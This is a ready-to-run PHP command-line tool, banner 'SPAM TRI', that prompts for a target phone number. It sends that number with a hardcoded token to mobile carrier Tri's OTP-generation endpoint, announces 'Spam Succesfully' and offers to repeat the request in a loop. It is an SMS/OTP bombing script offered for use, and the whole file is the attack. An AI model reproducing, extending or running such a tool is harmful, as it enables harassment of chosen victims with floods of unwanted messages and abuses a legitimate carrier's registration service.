<?php



function http($no) {
      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, "https://registrasi.tri.co.id/daftar/generateOTP");
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
      curl_setopt($ch, CURLOPT_POST, 1);
      curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Linux; <Android Version>; <Build Tag etc.>) AppleWebKit/<WebKit Rev> (KHTML, like Gecko) Chrome/<Chrome Rev> Mobile Safari/<WebKit Rev>");
      curl_setopt($ch, CURLOPT_POSTFIELDS, "token=5ZB6kXMcP4oTgAWsiQCdqU1e4p5WQYKV&msisdn=$no");
      $res = curl_exec($ch);
      curl_close($ch);
      return $res;
}

function run() {
      system('clear');
      echo "\033[91m";
      system("figlet SPAM TRI");
      echo "\033[97m________________________________________________\n";
      echo "\n";
      echo "\033[95m#~ Author By : Official Cyber Team\n";
      echo "#~ Facebook  : https://www.facebook.com/Dee Junn\n";
      echo "#~ My Ig     : dee_junn24\n";
      echo "#~ Chanel Yt : Official Cyber Team\n";
      echo "\033[97m________________________________________________\n";
      echo "\n";
      echo "\n";
      echo "\033[92mNomor Target [08××] : ";
      $nomor = trim(fgets(STDIN));
      $exec = http($nomor);
      echo "\n";
      $js = json_decode($exec, true);
      print_r($js);
      echo "\n";
      if ($js['status'] != "failed") {
         echo "\033[97m[+] Spam Succesfully..\n";
      } else {
         echo "[-] Spam Gagal..";
      }
      echo "\n";
      echo "\033[92mIngin Mengulang (y/n) ? ";
      $ul = trim(fgets(STDIN));
      if ($ul == "y") {
         run();
      } else {
         echo "\033[92mThanksss Udah Pakee Yah :)\n";
      }
}


run();

?>
